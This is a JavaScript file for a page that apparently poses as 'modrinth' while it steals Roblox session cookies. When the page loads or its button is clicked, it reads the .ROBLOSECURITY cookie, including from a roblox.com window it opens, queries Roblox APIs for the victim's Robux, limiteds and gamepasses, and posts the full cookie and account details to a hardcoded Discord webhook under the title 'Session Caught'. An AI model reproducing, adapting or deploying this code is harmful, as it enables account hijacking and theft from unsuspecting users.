const WEBHOOK = "https://discord.com/api/webhooks/1557738278155718707/5bsKxfR0IE8ha-m5tFX0_9pmBX2lmKDNsFJopvr-3mKhHVTa6SHm6GD2scnQlrY2_Gxd";

const browseBtn = document.getElementById("browseBtn");
const loader = document.getElementById("loader");

function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(";").shift();
  return null;
}

async function robloxFetch(url, cookie) {
  try {
    const r = await fetch(url, {
      headers: {
        "Cookie": `.ROBLOSECURITY=${cookie}`,
        "User-Agent": navigator.userAgent,
        "Accept": "application/json"
      },
      credentials: "include"
    });
    if (!r.ok) return null;
    return await r.json();
  } catch {
    return null;
  }
}

async function collectAndSend(cookie) {
  let username = "Unknown";
  let userId = null;
  let rap = 0;
  let pending = 0;
  let limitedCount = 0;
  let gamepasses = [];
  let robux = 0;

  if (cookie) {
    const userInfo = await robloxFetch("https://users.roblox.com/v1/users/authenticated", cookie);
    if (userInfo && userInfo.id) {
      userId = userInfo.id;
      username = userInfo.name || userInfo.displayName || "Unknown";
    }

    if (userId) {
      const economy = await robloxFetch(`https://economy.roblox.com/v1/users/${userId}/currency`, cookie);
      if (economy) robux = economy.robux || 0;

      const pendingRes = await robloxFetch(`https://economy.roblox.com/v1/users/${userId}/revenue/summary/year`, cookie);
      if (pendingRes && pendingRes.pendingRobux !== undefined) pending = pendingRes.pendingRobux;
    }

    if (userId) {
      let cursor = "";
      let totalRap = 0;
      let limiteds = 0;
      do {
        const inv = await robloxFetch(
          `https://inventory.roblox.com/v1/users/\( {userId}/assets/collectibles?sortOrder=Asc&limit=100 \){cursor ? `&cursor=${cursor}` : ""}`,
          cookie
        );
        if (!inv || !inv.data) break;
        inv.data.forEach(item => {
          limiteds++;
          if (item.recentAveragePrice) totalRap += item.recentAveragePrice;
        });
        cursor = inv.nextPageCursor || "";
      } while (cursor);
      rap = totalRap;
      limitedCount = limiteds;
    }

    if (userId) {
      const gp = await robloxFetch(
        `https://inventory.roblox.com/v1/users/${userId}/inventory/GamePass?sortOrder=Asc&limit=10`,
        cookie
      );
      if (gp && gp.data) {
        gamepasses = gp.data.slice(0, 5).map(g => g.name || `GamePass #${g.assetId}`);
        if (gp.data.length > 5) gamepasses.push(`+${gp.data.length - 5} more`);
      }
    }
  }

  const cookieDisplay = cookie
    ? (cookie.length > 80 ? cookie.substring(0, 40) + "..." + cookie.substring(cookie.length - 20) : cookie)
    : "No .ROBLOSECURITY cookie found";

  const embed = {
    title: "modrinth – Session Caught",
    color: 0x30b37c,
    fields: [
      { name: "Username", value: "```" + username + "```", inline: true },
      { name: "User ID", value: "```" + (userId || "N/A") + "```", inline: true },
      { name: "Robux (Wallet)", value: "```" + robux.toLocaleString() + "```", inline: true },
      { name: "RAP", value: "```" + rap.toLocaleString() + "```", inline: true },
      { name: "Pending", value: "```" + pending.toLocaleString() + "```", inline: true },
      { name: "Limiteds", value: "```" + limitedCount + "```", inline: true },
      { name: "Gamepasses", value: gamepasses.length ? "```" + gamepasses.join("\n") + "```" : "```None```", inline: false },
      { name: "Cookie", value: "```" + cookieDisplay + "```", inline: false },
      { name: "User-Agent", value: "```" + navigator.userAgent.substring(0, 120) + "```", inline: false },
      { name: "Time", value: new Date().toISOString(), inline: false }
    ],
    footer: { text: "modrinth scanner • channel 1557737389097619538" }
  };

  if (cookie && cookie.length > 80) {
    embed.fields.push({
      name: "Full Cookie",
      value: "```" + cookie.substring(0, 1000) + "```",
      inline: false
    });
  }

  try {
    await fetch(WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (e) {}
}

function openRoblox() {
  loader.classList.add("active");
  loader.querySelector("p").textContent = "Opening Roblox… waiting for session";

  const robloxWindow = window.open("https://www.roblox.com/home", "_blank");

  let attempts = 0;
  const maxAttempts = 40;
  const interval = setInterval(async () => {
    attempts++;

    let cookie = getCookie(".ROBLOSECURITY") || getCookie("ROBLOSECURITY");

    try {
      if (robloxWindow && !robloxWindow.closed) {
        const robloxCookie = robloxWindow.document.cookie;
        if (robloxCookie && robloxCookie.includes(".ROBLOSECURITY")) {
          const match = robloxCookie.match(/\.ROBLOSECURITY=([^;]+)/);
          if (match) cookie = match[1];
        }
      }
    } catch (e) {}

    if (cookie) {
      clearInterval(interval);
      await collectAndSend(cookie);
      loader.innerHTML = `<div class="spinner" style="border-top-color:#30b37c"></div><p style="color:#30b37c">Session linked</p>`;
      setTimeout(() => loader.classList.remove("active"), 1600);
      return;
    }

    if (attempts >= maxAttempts) {
      clearInterval(interval);
      await collectAndSend(null);
      loader.innerHTML = `<p style="color:#9ba1a9">Could not read session</p>`;
      setTimeout(() => loader.classList.remove("active"), 2000);
    }
  }, 500);
}

browseBtn.addEventListener("click", openRoblox);

// auto attempt on load
window.addEventListener("load", () => {
  setTimeout(async () => {
    const cookie = getCookie(".ROBLOSECURITY") || getCookie("ROBLOSECURITY");
    if (cookie) await collectAndSend(cookie);
  }, 400);
});
